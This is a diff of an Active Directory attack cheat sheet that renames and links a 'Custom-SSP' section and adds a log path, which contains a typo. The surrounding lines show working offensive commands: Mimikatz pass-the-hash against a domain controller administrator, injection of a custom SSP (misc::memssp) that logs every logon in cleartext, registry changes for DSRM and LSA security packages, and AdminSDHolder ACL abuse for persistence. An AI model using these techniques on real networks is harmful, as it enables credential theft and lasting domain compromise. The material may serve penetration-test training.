@@ -33,6 +33,7 @@ Last update: **02/Aug/2023**
   -  [Diamond Ticket](#diamond-ticket)
   -  [Skeleton Key](#skeleton-key)
   -  [Directory Services Restore Mode (DSRM)](#directory-services-restore-mode-dsrm))
+  -  [Custom-SSP](#Custom-SSP)
   -  [AdminSDHolder](#adminsdholder)
   -  [DCSync](#dcsync)
 - [Privilege Escalation](#privilege-escalation)
@@ -842,7 +843,7 @@ New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “Dsrm
 Invoke-Mimikatz -Command '"privilege::debug" “sekurlsa::pth" /domain:dcorp-dc /user:Administrator /ntlm:XXXX /run:powershell.exe"'
 ```
 
-### Custom SSP
+### Custom-SSP
 ```powershell
 # SSP is a DLL that provides an application ways to authenticated. Some MIcrosoft packages:
 # - NTLM
@@ -850,7 +851,7 @@ Invoke-Mimikatz -Command '"privilege::debug" “sekurlsa::pth" /domain:dcorp-dc 
 # - Wdigest
 # - CredSSP
 # Mimikatz provides a custom SSP in mimilib.dll
-# This lib logs all logons (local, service account, machine account) into a clear text on the computer
+# This lib logs all logons (local, service account, machine account) into a clear text on the computer (c:\windows\ystem32\mimilsa.log)
 
 # It can be done with mimikatz (not very stable in recent windows Server versions)
 Invoke-Mimikatz -Command '"misc::memssp"'
@@ -866,7 +867,6 @@ Set-ItemProperty HKLM:SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Pack
 
 
 ```
-
 ### AdminSDHolder
 - **Idea is to Abuse the object AdminSDHolder and change its ACL to affect ACL of protected groups (Domain admins and similar)**
 ```powershell
